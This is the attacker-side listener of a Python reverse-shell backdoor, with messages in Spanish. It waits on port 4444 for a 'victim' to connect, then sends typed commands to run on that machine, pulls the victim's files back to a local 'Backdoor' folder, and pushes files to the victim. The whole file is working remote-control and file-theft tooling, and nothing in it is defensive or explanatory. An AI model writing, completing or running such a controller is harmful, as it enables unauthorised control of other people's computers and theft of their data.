import socket
from unittest import result
import json
import base64
from os import path

my_ip = "172.22.35.99"

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Esperando por conexiones ...")
        self.connection, address = listener.accept()
        print("\n[+] Victima conectada" + "\nIP: " + str(address))
        print("OS: " + self.reliable_recieve())
    
    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)
    
    def reliable_recieve(self):
        data = b''
        while True:
            try:
                json_data = self.connection.recv(4096)
                data += json_data
                if len(json_data) < 4096:
                    break
                print ("[...] Descargando")
            except ValueError:
                continue
        return json.loads(data)
    
    def escribir_archivo(self, path, content):
        with open("/Users/tserra/Documents/Backdoor/Images/" + path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Descarga completa de " + path

    def ejecutar_remoto(self, command):
        self.reliable_send(command)
        if(command[0] == "exit"):

            self.connection.close()
            exit()

        return self.reliable_recieve()
    
    def send_file(self, ruta):
        if path.exists(ruta):
            with open(ruta, "rb") as file:
                print(base64.b64encode(file.read()))
                self.reliable_send(base64.b64encode(file.read()))
                return self.reliable_recieve()
        else:
            return "[x] El elemento " + ruta + " no existe"

    def run(self):
        while True:
            command = raw_input(">> ")
            command = command.split(" ")
            result = self.ejecutar_remoto(command)

            if command[0] == "download":
                ruta = ""
                for i in range(1, (len(command))):
                    if i>1:
                        ruta += " " + command[i]
                    else: 
                        ruta += command[i]
                result = self.escribir_archivo(ruta, result)
            elif command[0] == "send":
                ruta = ""
                for i in range(1, (len(command))):
                    if i>1:
                        ruta += " " + command[i]
                    else: 
                        ruta += command[i]
                result = self.send_file(ruta)
            
            print(result)

escuchar = Listener(my_ip, 4444)
escuchar.run()